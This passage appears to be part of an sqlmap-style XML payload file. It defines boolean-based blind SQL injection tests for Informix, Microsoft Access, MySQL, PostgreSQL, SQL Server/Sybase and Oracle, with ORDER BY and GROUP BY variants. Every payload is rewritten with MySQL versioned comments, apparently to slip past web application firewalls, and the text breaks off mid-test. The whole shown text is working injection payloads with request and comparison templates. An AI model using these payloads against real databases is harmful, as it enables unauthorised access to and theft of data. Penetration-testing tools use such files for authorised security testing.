            <payload>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000SYSMASTER/**_**/*/:/*!50000SYSDUAL/**_**/*/)</payload>
        </request>
        <response>
            <comparison>(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000SYSMASTER/**_**/*/:/*!50000SYSDUAL/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>Informix</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft Access boolean-based blind - Parameter replace</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>/*!50000IIF/**_**/*/([/*!50000INFERENCE/**_**/*/],[/*!50000RANDNUM/**_**/*/],/*!500001/**_**/*///*!500000/**_**/*/)</vector>
        <request>
            <payload>/*!50000IIF/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/],[/*!50000RANDNUM/**_**/*/],/*!500001/**_**/*///*!500000/**_**/*/)</payload>
        </request>
        <response>
            <comparison>/*!50000IIF/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/],[/*!50000RANDNUM/**_**/*/],/*!500001/**_**/*///*!500000/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>Microsoft Access</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft Access boolean-based blind - Parameter replace (original value)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>/*!50000IIF/**_**/*/([/*!50000INFERENCE/**_**/*/],[/*!50000ORIGVALUE/**_**/*/],/*!500001/**_**/*///*!500000/**_**/*/)</vector>
        <request>
            <payload>/*!50000IIF/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/],[/*!50000ORIGVALUE/**_**/*/],/*!500001/**_**/*///*!500000/**_**/*/)</payload>
        </request>
        <response>
            <comparison>/*!50000IIF/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/],[/*!50000ORIGVALUE/**_**/*/],/*!500001/**_**/*///*!500000/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>Microsoft Access</dbms>
        </details>
    </test>

    <!-- Works in MySQL, Oracle, etc. -->
    <test>
        <title>Boolean-based blind - Parameter replace (DUAL)</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/] /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/)</vector>
        <request>
            <payload>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/] /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/)</payload>
        </request>
        <response>
            <comparison>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/] /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/)</comparison>
        </response>
    </test>

    <test>
        <title>Boolean-based blind - Parameter replace (DUAL - original value)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>3</where>
        <vector>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/] /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/)</vector>
        <request>
            <payload>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/] /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/)</payload>
        </request>
        <response>
            <comparison>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/ /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/] /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/)</comparison>
        </response>
    </test>
    <!-- End of boolean-based blind tests - Parameter replace -->

    <!-- Works in SAP MaxDB, Informix, etc. -->
    <test>
        <title>Boolean-based blind - Parameter replace (CASE)</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000INFERENCE/**_**/*/] /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/)</vector>
        <request>
            <payload>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/] /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/)</payload>
        </request>
        <response>
            <comparison>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/] /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/)</comparison>
        </response>
    </test>

    <test>
        <title>Boolean-based blind - Parameter replace (CASE - original value)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,3</clause>
        <where>3</where>
        <vector>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000INFERENCE/**_**/*/] /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/)</vector>
        <request>
            <payload>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/] /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/)</payload>
        </request>
        <response>
            <comparison>(/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/] /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!50000NULL/**_**/*/ /*!50000END/**_**/*/)</comparison>
        </response>
    </test>
    <!-- End of boolean-based blind tests - Parameter replace -->

    <!-- Boolean-based blind tests - ORDER BY, GROUP BY clause -->
    <test>
        <title>MySQL &gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/))</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/))</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
            <dbms_version>&gt;= 5.0</dbms_version>
        </details>
    </test>

    <test>
        <title>MySQL &gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/))</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/))</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
            <dbms_version>&gt;= 5.0</dbms_version>
        </details>
    </test>

    <test>
        <title>MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/))</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/))</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
            <dbms_version>&lt; 5.0</dbms_version>
        </details>
    </test>

    <test>
        <title>MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/))</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000FROM/**_**/*/ /*!50000INFORMATION_SCHEMA/**_**/*/./*!50000PLUGINS/**_**/*/) /*!50000END/**_**/*/))</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
            <dbms_version>&lt; 5.0</dbms_version>
        </details>
    </test>

    <test>
        <title>PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/**_**/*//(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/) /*!50000END/**_**/*/))</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/**_**/*//(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500001/**_**/*//(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/) /*!50000END/**_**/*/))</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <!-- It exclusively works with ORDER BY -->
    <test>
        <title>PostgreSQL boolean-based blind - ORDER BY clause (original value)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>3</clause>
        <where>1</where>
        <vector>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!500001/**_**/*//(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/) /*!50000END/**_**/*/))</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!500001/**_**/*//(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!500001/**_**/*//(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/) /*!50000END/**_**/*/))</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <!--
         TODO: this would work for GROUP BY too if sqlmap did not enclose string-based [ORIGVALUE] with single quotes, but then other payloads would break.
               It already works for ORDER BY because it accepts int whereas GROUP BY only accepts format [table].[column] so [ORIGVALUE] must where it is
    -->
    <test>
        <!-- <title>PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause (GENERATE_SERIES - original value)</title> -->
        <title>PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <!-- <clause>2,3</clause> -->
        <clause>3</clause>
        <where>1</where>
        <vector>,(/*!50000SELECT/**_**/*/ * /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES/**_**/*/([/*!50000RANDNUM/**_**/*/],[/*!50000RANDNUM/**_**/*/],/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END/**_**/*/) /*!50000LIMIT/**_**/*/ /*!500001/**_**/*/)</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ * /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES/**_**/*/([/*!50000RANDNUM/**_**/*/],[/*!50000RANDNUM/**_**/*/],/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END/**_**/*/) /*!50000LIMIT/**_**/*/ /*!500001/**_**/*/)</payload>
        </request>
        <response>
            <comparison>,(/*!50000SELECT/**_**/*/ * /*!50000FROM/**_**/*/ /*!50000GENERATE_SERIES/**_**/*/([/*!50000RANDNUM/**_**/*/],[/*!50000RANDNUM/**_**/*/],/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!500000/**_**/*/ /*!50000END/**_**/*/) /*!50000LIMIT/**_**/*/ /*!500001/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>3</clause>
        <where>1</where>
        <vector>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/]) /*!50000END/**_**/*/))</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/]) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/]) /*!50000END/**_**/*/))</comparison>
        </response>
        <details>
            <dbms>Microsoft SQL Server</dbms>
            <dbms>Sybase</dbms>
        </details>
    </test>

    <test>
        <title>Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>3</clause>
        <where>1</where>
        <vector>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/]) /*!50000END/**_**/*/))</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/]) /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ [/*!50000RANDNUM/**_**/*/]*(/*!50000SELECT/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000UNION/**_**/*/ /*!50000ALL/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/]) /*!50000END/**_**/*/))</comparison>
        </response>
        <details>
            <dbms>Microsoft SQL Server</dbms>
            <dbms>Sybase</dbms>
        </details>
    </test>

    <test>
        <title>Oracle boolean-based blind - ORDER BY, GROUP BY clause</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>2,3</clause>
        <where>1</where>
        <vector>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/(/*!500001/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT/**_**/*/)/(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/)</vector>
        <request>
            <payload>,(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ /*!500001/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/(/*!500001/**_**/*/ /*!50000AS/**_**/*/ /*!50000INT/**_**/*/)/(/*!50000SELECT/**_**/*/ /*!500000/**_**/*/ /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/)</payload>
        </request>
        <response>
